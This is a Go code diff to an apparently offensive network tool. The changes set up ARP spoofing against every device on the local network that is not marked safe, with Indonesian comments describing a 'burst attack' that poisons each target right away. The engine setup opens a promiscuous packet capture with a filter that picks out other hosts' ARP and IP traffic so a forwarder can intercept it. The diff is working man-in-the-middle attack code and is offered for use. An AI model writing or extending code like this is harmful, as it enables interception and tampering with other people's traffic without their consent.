@@ -367,18 +367,33 @@ func (m *model) refreshTable() {
 	if currentCursor < len(rows) { m.table.SetCursor(currentCursor) }
 }
 
+// [UPDATED] Helper Logic di main.go
 func (m *model) activateAllDevices() {
 	for _, d := range m.devices {
-		if !isSafeDevice(&d, *m) { m.addToSession(&d) }
+		if !isSafeDevice(&d, *m) { 
+			m.addToSession(&d) // Ini akan otomatis memanggil AttackSingleTarget
+		}
 	}
 }
 
+// [UPDATED] Helper Logic di main.go
+
 func (m *model) addToSession(d *models.Device) {
 	mac := d.MAC.String()
+	// 1. Tambahkan ke Session
 	if m.session.GetTarget(mac) == nil {
 		name := m.aliases[mac]
 		if name == "" { name = d.Vendor }
 		m.session.AddTarget(*d, name)
+	}
+
+	// 2. [BURST ATTACK] Paksa racuni target SEKARANG JUGA
+	// Jangan tunggu ticker loop berikutnya.
+	if m.spoofer != nil {
+		t := m.session.GetTarget(mac)
+		if t != nil {
+			go m.spoofer.AttackSingleTarget(t)
+		}
 	}
 }
 
@@ -453,10 +468,19 @@ func setupEngineCmd(scanner *core.Scanner, gwIP net.IP, session *models.SessionM
 	return func() tea.Msg {
 		gwMAC := net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff} 
 		spoofer := core.NewSpoofer(scanner.InterfaceName, scanner.MyMAC, scanner.MyIP, gwIP, gwMAC, session)
+		
+		// 1. Promiscuous TRUE Handle for Forwarder
 		fHandle, err := pcap.OpenLive(scanner.InterfaceName, 65536, true, pcap.BlockForever)
 		if err != nil { return engineReadyMsg{err: err} }
-		// BPF Simple
-		fHandle.SetBPFFilter("ip") 
+		
+		// 2. FILTER PACKETS.
+		myIP := scanner.MyIP.String()
+		filter := fmt.Sprintf("arp or (ip and not dst host %s)", myIP)
+		
+		if err := fHandle.SetBPFFilter(filter); err != nil {
+			fmt.Println("BPF Error:", err)
+		}
+		
 		forwarder := core.NewForwarder(fHandle, scanner.MyMAC, gwMAC, session)
 		stopChan := make(chan struct{})
 		return engineReadyMsg{spoofer: spoofer, forwarder: forwarder, stopChan: stopChan}
